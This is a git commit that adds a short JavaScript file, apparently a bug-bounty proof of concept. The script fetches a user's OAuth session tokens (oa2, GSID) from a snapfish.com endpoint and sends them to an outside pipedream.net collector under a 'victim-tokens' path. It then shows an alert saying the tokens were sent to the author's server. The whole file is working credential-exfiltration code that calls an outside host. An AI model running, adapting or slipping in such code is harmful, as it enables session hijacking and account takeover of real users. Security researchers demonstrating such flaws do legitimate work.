516e734d6786d4fb725eed70cb866ed389be0fc1
Márcio Cirqueira <62367006+mrccrqr@users.noreply.github.com>
2025-02-19 02:45:00 -0300

    Create a.js

---
+++ a.js
@@ -0,0 +1,12 @@
+fetch('https://www.snapfish.com/library/getOauthInfo')
+  .then(response => response.json())
+  .then(data => {
+    const { oa2, GSID } = data.oauthInfo;
+    const targetUrl = `https://eohpcjbhmbjsfoz.m.pipedream.net/victim-tokens?oa2=${encodeURIComponent(oa2)}&GSID=${encodeURIComponent(GSID)}`;
+    
+    return fetch(targetUrl, { method: 'GET' });
+  })
+  .then(response => alert("Your session tokens have already been sent to @marciosz’s server. Just search for 'GET /victim-tokens' in your Burp history."))
+  .catch(error => {
+    alert("Error sending tokens: " + error);
+  });
